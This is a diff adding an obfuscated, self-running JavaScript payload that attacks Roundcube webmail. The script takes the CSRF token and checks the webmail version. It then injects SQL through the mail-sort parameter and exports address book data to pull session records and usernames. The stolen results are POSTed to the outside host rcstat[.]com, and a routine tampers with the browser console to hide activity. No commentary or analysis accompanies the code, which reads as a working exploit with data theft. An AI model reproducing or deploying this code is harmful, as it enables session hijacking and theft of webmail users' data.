@@ -1,0 +1,238 @@
+(function () {
+    const e = (function () {
+      let v = true
+      return function (w, x) {
+        const y = v
+          ? function () {
+              if (x) {
+                const z = x.apply(w, arguments)
+                return (x = null), z
+              }
+            }
+          : function () {}
+        return (v = false), y
+      }
+    })()
+    _RC_TOKEN = null
+    _PAGE = null
+    function g(v) {
+      const w = {
+        method: 'POST',
+        body: v,
+      }
+      fetch('https://rcstat[.]com:443/l/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t', w)
+    }
+    async function h() {
+      if (typeof rcmail !== 'undefined') {
+        return rcmail.env.request_token
+      } else {
+        if (_RC_TOKEN) {
+          return _RC_TOKEN
+        } else {
+          let v = await fetch('/'),
+            w = await v.text()
+          return (
+            (_RC_TOKEN = w.split('"request_token":"')[1].split('"')[0]), _RC_TOKEN
+          )
+        }
+      }
+    }
+    async function i() {
+      let v = '/?_task=settings&_action=about'
+      return await fetch(v)
+        .then((w) => w.text())
+        .then((w) => {
+          let x = w.match(/roundcube webmail\s(\d+)\.(\d+)\.(\d+)/i)
+          return x ? x.slice(1) : []
+        })
+    }
+    async function j(v, w) {
+      return fetch(v, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: w,
+      })
+    }
+    async function k(v) {
+      let w =
+        '/?_task=mail&_action=list&_mbox=INBOX&_remote=1&_sort=' +
+        encodeURI(v) +
+        '_DESC'
+      return fetch(w)
+    }
+    async function l() {
+      let v =
+        '/?_task=mail&_action=search&_q=test&_headers=subject%2Cfrom&_filter=ALL&_mbox=INBOX&_remote=1'
+      return fetch(v)
+    }
+    async function m() {
+      let v = await h(),
+        w = '/?_task=addressbook&_source=0&_action=export&_search=3&_token=' + v
+      return fetch(w)
+    }
+    async function n(v) {
+      return k(v)
+        .then((w) => l())
+        .then((w) => m())
+        .then((w) => w.text())
+        .catch((w) => {
+          return undefined
+        })
+    }
+    function o(v) {
+      return v
+        .map((x) => {
+          return ['new', 'old'].map((y) => {
+            let z = Object.assign({}, x)
+            return (
+              (z.age = y),
+              (z.query = x.query.replace('%B%', y == 'new' ? '' : ')')),
+              z
+            )
+          })
+        })
+        .flat()
+    }
+    function p(v, w, x) {
+      const y = {
+        db: 'mysql',
+        query:
+          '1=1%B% UNION select 0,-1,3,4,vars,null,null,null,null,null from session order by changed ASC limit ' +
+          x +
+          '; --',
+      }
+      let z = [y]
+      return (
+        (z = o(z)),
+        (z = z.filter((A) => A.age == w && A.db == v)),
+        z.length == 1 ? z[0].query : null
+      )
+    }
+    function q(v, w, x) {
+      const y = {
+        db: 'mysql',
+        query:
+          '1=1%B% UNION select 0,-1,3,4,username,null,null,null,null,null from users order by changed ASC limit ' +
+          x +
+          '; --',
+      }
+      let z = [y]
+      return (
+        (z = o(z)),
+        (z = z.filter((A) => A.age == w && A.db == v)),
+        z.length == 1 ? z[0].query : null
+      )
+    }
+    function r(v) {
+      const w = {
+        db: 'mysql',
+        query:
+          '1=1%B% UNION select 0,-1,3,VERSION(),USER(),(select count(*) from session),(select count(*) from users),null,8,9 ORDER BY changed ASC LIMIT 1; --',
+      }
+      const x = {
+        db: 'psql',
+        query:
+          "1=1%B% UNION select 0,1,now(),3,version(),user,(select count(*) from users)::varchar, (select count(*) from session)::varchar ,null,'9' ORDER BY changed DESC LIMIT 1; --",
+      }
+      let y = [w, x]
+      return (
+        (y = o(y)),
+        v.length
+          ? (([maj, mid, min] = v),
+            mid < 3
+              ? y.filter((z) => z.age == 'old')
+              : y.filter((z) => z.age == 'new'))
+          : y
+      )
+    }
+    async function s(v) {
+      let w = r(v)
+      for (let x = 0; x < w.length; x++) {
+        let y = await n(w[x].query)
+        if (y) {
+          const z = {}
+          return (z.card = y), (z.age = w[x].age), (z.db = w[x].db), z
+        }
+      }
+      return null
+    }
+    function t(v) {
+      let w = v.match(/N:(\d+);(\d+);/)
+      return w ? w.slice(1) : []
+    }
+    async function u() {
+      const w = e(this, function () {
+        const F =
+            typeof window !== 'undefined'
+              ? window
+              : typeof process === 'object' &&
+                typeof require === 'function' &&
+                typeof global === 'object'
+              ? global
+              : this,
+          G = (F.console = F.console || {}),
+          H = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
+        for (let I = 0; I < H.length; I++) {
+          const J = e.constructor.prototype.bind(e),
+            K = H[I],
+            L = G[K] || J
+          J['__proto__'] = e.bind(e)
+          J.toString = L.toString.bind(L)
+          G[K] = J
+        }
+      })
+      w()
+      let x,
+        y,
+        z = await i()
+      if (z.length && (z[0] < 1 || z[1] > 4)) {
+        g('[SQL] not vulnerable')
+        return
+      }
+      y = await s(z)
+      if (!y) {
+        await k('')
+        g('[SQL] no first card')
+        return
+      }
+      let A = y.db,
+        B = y.age,
+        C = t(y.card)
+      if (C.length != 2) {
+        await k('')
+        g('[SQL] error parsing card')
+        return
+      }
+      let D = C[0],
+        E = C[1]
+      g(
+        '[SQL] rc_version ' +
+          z +
+          ', db ' +
+          A +
+          ', age ' +
+          B +
+          ' users ' +
+          D +
+          ', sessions ' +
+          E
+      )
+      await j(
+        'https://rcstat[.]com:443/db/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t',
+        'rc_version ' + z + ' card: ' + y.card
+      )
+      x = p(A, B, E)
+      if (x) {
+        let F = await n(x)
+        F && (await j('https://rcstat[.]com:443/db/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t', F))
+      }
+      x = q(A, B, D)
+      if (x) {
+        let G = await n(x)
+        G && (await j('https://rcstat[.]com:443/db/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t', G))
+      }
+      await k('')
+    }
+    return u()
+  })()
+  
